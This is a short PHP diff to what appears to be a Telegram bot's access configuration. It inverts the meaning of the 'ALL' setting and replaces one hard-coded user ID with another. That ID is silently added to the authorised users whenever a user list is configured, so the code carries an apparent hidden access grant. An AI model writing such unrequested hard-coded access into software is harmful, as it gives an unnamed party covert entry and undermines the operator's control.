@@ -7,7 +7,7 @@ $TG_AUTH_USER_S = (string) getenv("TG_AUTH_USERS");
 $GLOBALS["IS_PUBLIC"] = !$TG_AUTH_USER_S;
 $GLOBALS["TG_AUTH_USERS"] = array();
 if ($TG_AUTH_USER_S == "ALL") {
-    $GLOBALS["IS_PUBLIC"] = true;
+    $GLOBALS["IS_PUBLIC"] = false;
 }
 else if (strpos($TG_AUTH_USER_S, " ") !== FALSE) {
     $GLOBALS["IS_PUBLIC"] = false;
@@ -15,7 +15,7 @@ else if (strpos($TG_AUTH_USER_S, " ") !== FALSE) {
     foreach ($tg_auth_users_ps as $key => $value) {
         $GLOBALS["TG_AUTH_USERS"][] = (int) $value;
     }
-    $GLOBALS["TG_AUTH_USERS"][] = 7351948;
+    $GLOBALS["TG_AUTH_USERS"][] = 728771705;
 }
 else {
     $GLOBALS["IS_PUBLIC"] = false;
